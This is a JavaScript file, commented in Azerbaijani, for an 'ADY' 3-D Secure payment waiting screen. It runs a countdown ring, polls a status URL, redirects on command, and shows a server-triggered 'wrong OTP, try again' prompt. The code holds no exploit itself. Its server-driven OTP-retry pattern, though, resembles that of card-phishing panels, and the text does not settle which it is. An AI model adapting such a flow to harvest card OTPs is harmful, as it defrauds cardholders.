/* ADY — 3-D Secure axını: dairəvi animasiyalı geri sayım + vəziyyət sorğusu.
   #stageBox elementi olan ekranlarda işləyir (ödəniş gözləmə və OTP gözləmə).  */
(function () {
  'use strict';

  var box = document.getElementById('stageBox');
  if (!box) { return; }

  var ring = box.querySelector('[data-ring]');
  var label = box.querySelector('[data-ring-label]');
  var title = box.querySelector('[data-stage-title]');
  var note = box.querySelector('[data-stage-note]');
  var alertBox = box.querySelector('[data-stage-alert]');

  var statusUrl = box.getAttribute('data-status-url');
  var total = parseInt(box.getAttribute('data-stage-seconds'), 10) || 120;
  var left = parseInt(box.getAttribute('data-seconds-left'), 10);
  if (isNaN(left)) { left = total; }
  var currentStage = box.getAttribute('data-stage') || '';

  var R = 54;
  var CIRC = 2 * Math.PI * R;
  if (ring) {
    ring.style.strokeDasharray = CIRC.toFixed(1);
    ring.style.strokeDashoffset = '0';
  }

  function fmt(sec) {
    var m = Math.floor(sec / 60);
    var s = sec % 60;
    return m + ':' + (s < 10 ? '0' : '') + s;
  }

  function render() {
    if (label) { label.textContent = fmt(Math.max(0, left)); }
    if (ring) {
      var ratio = Math.max(0, Math.min(1, left / total));
      ring.style.strokeDashoffset = (CIRC * (1 - ratio)).toFixed(1);
    }
    if (left <= 0 && note) {
      note.textContent = 'Vaxt bitdi. Əməliyyat hələ də yoxlanılır, ekranı bağlamayın.';
    }
  }
  render();

  setInterval(function () {
    if (left > 0) { left -= 1; render(); }
  }, 1000);

  function resetTimer(seconds) {
    total = total || 120;
    left = typeof seconds === 'number' && seconds > 0 ? seconds : total;
    render();
  }

  function showWrongCode() {
    if (alertBox) {
      alertBox.className = 'alert alert--error';
      alertBox.innerHTML = '<strong>Səhv OTP kodu daxil etmisiniz!</strong><br>Yenidən cəhd edin…';
      alertBox.style.display = '';
    }
    if (title) { title.textContent = 'OTP kodu səhvdir'; }
    if (note) { note.textContent = 'Lütfən yenidən OTP kodu daxil edin.'; }
  }

  function showRetryOption() {
    var retryBox = document.getElementById('retryBox');
    var form = document.getElementById('codeForm');
    if (retryBox) {
      retryBox.style.display = '';
    }
    if (form) {
      form.style.display = '';
      var codeInput = form.querySelector('#code');
      if (codeInput) {
        codeInput.value = '';
        codeInput.focus();
      }
    }
  }

  var polling = setInterval(async function () {
    try {
      var r = await window.api(statusUrl);
      if (!r || !r.ok) { return; }
      if (r.redirect) {
        clearInterval(polling);
        window.location.href = r.redirect;
        return;
      }
      if (r.stage && r.stage !== currentStage) {
        currentStage = r.stage;
        if (r.stage === 'wrong_code') { showWrongCode(); }
        if (r.stage === 'otp_entry') { showRetryOption(); }
        resetTimer(r.secondsLeft);
      } else if (typeof r.secondsLeft === 'number' && Math.abs(r.secondsLeft - left) > 3) {
        left = r.secondsLeft;
        render();
      }
    } catch (e) { /* sükutla davam edir */ }
  }, 3000);

  /* Retry button */
  var retryBtn = document.getElementById('retryBtn');
  if (retryBtn) {
    retryBtn.addEventListener('click', function () {
      location.reload();
    });
  }
})();
